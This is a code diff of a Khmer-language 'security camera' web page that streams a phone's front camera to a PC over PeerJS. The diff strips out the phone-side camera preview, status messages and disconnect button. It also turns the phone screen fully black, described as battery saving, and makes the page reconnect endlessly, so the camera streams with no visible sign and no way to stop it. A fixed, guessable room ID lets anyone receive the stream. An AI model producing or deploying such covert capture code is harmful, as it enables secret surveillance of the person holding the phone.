@@ -3,33 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ប្រព័ន្ធកាមេរ៉ាមុខ សម្រាប់កុំព្យូទ័រ និងទូរសព្ទ</title>
+    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាពឆ្លាតវៃ ២០២៦</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e1e; color: #fff; text-align: center; margin: 0; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; background: #2d2d2d; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        video { width: 100%; max-width: 640px; background: #000; border-radius: 8px; margin-top: 15px; border: 2px solid #00bcbc; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
+        .container { max-width: 700px; margin: 0 auto; background: #222; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        
+        /* កំណត់ទម្រង់វីដេអូឱ្យច្បាស់ល្អ */
+        video { width: 100%; max-width: 640px; background: #000; border-radius: 8px; margin-top: 15px; border: 2px solid #00ffcc; }
         #status { color: #ffc107; font-weight: bold; margin: 15px 0; font-size: 20px; }
-        .device-badge { display: inline-block; padding: 6px 12px; background: #444; border-radius: 20px; font-size: 14px; margin-bottom: 10px; color: #aaa; }
-        .btn-disconnect { background: #dc3545; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 15px; width: 100%; }
-        .btn-disconnect:hover { background: #c82333; }
+        .device-badge { display: inline-block; padding: 6px 12px; background: #333; border-radius: 20px; font-size: 14px; margin-bottom: 10px; color: #ccc; }
+        
+        /* ស្តាយពិសេសសម្រាប់ទូរសព្ទ៖ ធ្វើឱ្យអេក្រង់ខ្មៅងងឹតទាំងស្រុងដើម្បីសន្សំថ្ម */
+        .phone-dark-mode { background: #000000 !important; }
+        .phone-dark-mode .container { display: none !important; }
     </style>
 </head>
 <body>
 
-    <h2>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព (មើលឃើញលើកុំព្យូទ័រ ១០០%)</h2>
+    <div id="pc-content">
+        <h2>🖥️ ផ្ទាំងគ្រប់គ្រងកាមេរ៉ាសុវត្ថិភាព (សម្រាប់កុំព្យូទ័រ)</h2>
+    </div>
     
-    <div class="container">
+    <div class="container" id="main-container">
         <div id="device-type" class="device-badge">កំពុងពិនិត្យឧបករណ៍...</div>
         <div id="status">កំពុងចាប់ផ្តើមប្រព័ន្ធ...</div>
         
         <video id="view-video" autoplay playsinline muted></video>
-        
-        <button id="btn-close" class="btn-disconnect" onclick="disconnectPhone()">🛑 បិទកាមេរ៉ា (ដោះលែងប្រព័ន្ធ)</button>
     </div>
 
     <script>
-        // 🛠️ ប្រើប្រាស់ ID ថ្មីប្លែកគេ ដើម្បីកុំឱ្យស្ទះជាមួយកូដចាស់ៗ
+        // លេខសម្គាល់បន្ទប់រួមរវាងកុំព្យូទ័រ និងទូរសព្ទ
         const LIVE_ROOM_ID = 'hino-security-camera-system-2026';
         
         let peer = null;
@@ -37,24 +41,29 @@
         let localStream = null;
 
         window.onload = function() {
+            // ពិនិត្យថាជាទូរសព្ទ ឬកុំព្យូទ័រ
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
             if (!isMobile) {
-                document.getElementById('device-type').innerText = "💻 ឧបករណ៍៖ កុំព្យូទ័រ (អេក្រង់មើល)";
-                document.getElementById('btn-close').style.display = 'none';
+                // កូដដើរលើកុំព្យូទ័រ
+                document.getElementById('device-type').innerText = "💻 ឧបករណ៍៖ កុំព្យូទ័រ (អ្នកមើល)";
+                document.getElementById('view-video').style.display = 'block'; // បង្ហាញវីដេអូលើកុំព្យូទ័រ
                 runAsPC();
             } else {
-                document.getElementById('device-type').innerText = "📱 ឧបករណ៍៖ ទូរសព្ទ (កាមេរ៉ាមុខ)";
+                // កូដដើរលើទូរសព្ទ
+                document.getElementById('pc-content').style.display = 'none'; // លុបចំណងជើងចោល
+                document.getElementById('view-video').style.display = 'none'; // 🔥 បិទអេក្រង់កាមេរ៉ាលើទូរសព្ទចោលមិនឱ្យស៊ីថ្ម
+                document.body.classList.add('phone-dark-mode'); // 🔥 ធ្វើឱ្យទូរសព្ទងងឹតឈឹងទាំងស្រុង
+                
                 startCamera();
             }
         };
 
-        // --- កូដសម្រាប់ កុំព្យូទ័រ (អ្នកចាំមើល) ---
+        // --- ផ្នែកកុំព្យូទ័រ (Receiver) ---
         function runAsPC() {
             document.getElementById('status').innerText = "📡 រង់ចាំទូរសព្ទបាញ់វីដេអូមក...";
             if (peer) peer.destroy();
             
-            // កុំព្យូទ័របើកទ្វាររង់ចាំតាមលេខ ROOM ថេរ
             peer = new Peer(LIVE_ROOM_ID);
 
             peer.on('call', (call) => {
@@ -64,14 +73,24 @@
                     return;
                 }
 
+                // ឆ្លើយតបការហៅចូល
                 call.answer();
                 currentCall = call; 
-                document.getElementById('status').innerText = "✅ ភ្ជាប់ជោគជ័យ! កំពុងបង្ហាញរូបភាពនៅលើកុំព្យូទ័រ...";
+                document.getElementById('status').innerText = "✅ ភ្ជាប់ជោគជ័យ! កំពុងបង្ហាញរូបភាពកាមេរ៉ាមុខ...";
                 
                 call.on('stream', (remoteStream) => {
                     const video = document.getElementById('view-video');
                     video.srcObject = remoteStream;
-                    video.play().catch(e => console.log("Autoplay error:", e));
+                    
+                    // បង្ខំឱ្យវីដេអូដើរស្វ័យប្រវត្តទោះបីជា Chrome បិទក៏ដោយ
+                    let playPromise = video.play();
+                    if (playPromise !== undefined) {
+                        playPromise.catch(error => {
+                            console.log("Autoplay ត្រូវការការចុច៖", error);
+                            // បើគាំង ឱ្យអ្នកប្រើចុចលើអេក្រង់កុំព្យូទ័រម្តងដើម្បីមើល
+                            document.body.onclick = () => { video.play(); };
+                        });
+                    }
                 });
 
                 call.on('close', () => {
@@ -82,28 +101,29 @@
             });
 
             peer.on('error', (err) => {
-                console.error(err);
                 setTimeout(runAsPC, 2000);
             });
         }
 
-        // --- កូដសម្រាប់ ទូរសព្ទ (អ្នកបាញ់កាមេរ៉ា) ---
+        // --- ផ្នែកទូរសព្ទ (Transmitter) ---
         function startCamera() {
-            document.getElementById('status').innerText = "🎥 កំពុងបើកកាមេរ៉ាមុខ...";
-            
+            // កំណត់ទំហំវីដេអូកាមេរ៉ាមុខឱ្យរត់ស្រាល និងលឿនបំផុតដើម្បីកុំឱ្យគាំង
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" }, // បង្ហាញកាមេរ៉ាមុខ
+                video: { 
+                    facingMode: "user", // ប្រើកាមេរ៉ាមុខ
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 15 }
+                },
                 audio: false
             })
             .then((stream) => {
                 localStream = stream;
-                const video = document.getElementById('view-video');
-                video.srcObject = stream; // បង្ហាញលើទូរសព្ទដែរ
-
+                // មិនបាច់ដាក់ចូលទៅក្នុង <video> លើទូរសព្ទទេ គឺបាញ់ទៅកុំព្យូទ័រតែម្តង
                 connectToPC();
             })
             .catch((err) => {
-                document.getElementById('status').innerText = "⚠️ មិនអាចបើកកាមេរ៉ាបានទេ! សូមពិនិត្យសិទ្ធិការអនុញ្ញាតកាមេរ៉ា។";
+                console.error("មិនអាចបើកកាមេរ៉ាបានទេ:", err);
             });
         }
 
@@ -112,38 +132,21 @@
             peer = new Peer(); 
 
             peer.on('open', (id) => {
-                document.getElementById('status').innerText = "🔗 កំពុងទាក់ទង និងបាញ់វីដេអូទៅកុំព្យូទ័រ...";
-                
-                // ទូរសព្ទហៅទូរស័ព្ទផ្ទាល់ទៅកាន់ ID របស់កុំព្យូទ័រ
+                // បាញ់វីដេអូទៅកាន់កុំព្យូទ័រភ្លាមៗ
                 const call = peer.call(LIVE_ROOM_ID, localStream);
                 
                 if (call) {
                     currentCall = call;
-                    
-                    // ឆែកមើលលទ្ធផលបើកុំព្យូទ័រទទួល
-                    document.getElementById('status').innerText = "✅ បានបាញ់វីដេអូទៅកុំព្យូទ័រជោគជ័យ!";
-                    
                     call.on('close', () => {
-                        document.getElementById('status').innerText = "🔄 បានដាច់ការភ្ជាប់! កំពុងភ្ជាប់ឡើងវិញ...";
                         currentCall = null;
-                        setTimeout(connectToPC, 3000);
+                        setTimeout(connectToPC, 3000); // បើដាច់ ឱ្យភ្ជាប់ឡើងវិញស្វ័យប្រវត្ត
                     });
                 }
             });
 
             peer.on('error', (err) => {
-                document.getElementById('status').innerText = "🔄 កុំព្យូទ័រមិនទាន់បើកទំព័រ Web ទេ! កំពុងរង់ចាំ...";
-                setTimeout(connectToPC, 4000);
+                setTimeout(connectToPC, 4000); // ព្យាយាមភ្ជាប់ទៅកុំព្យូទ័រឡើងវិញរហូត
             });
-        }
-
-        function disconnectPhone() {
-            if (currentCall) currentCall.close();
-            if (peer) peer.destroy();
-            if (localStream) localStream.getTracks().forEach(track => track.stop()); 
-            
-            document.getElementById('status').innerText = "🛑 បានបិទកាមេរ៉ារួចរាល់។";
-            document.getElementById('view-video').srcObject = null;
         }
     </script>
 </body>
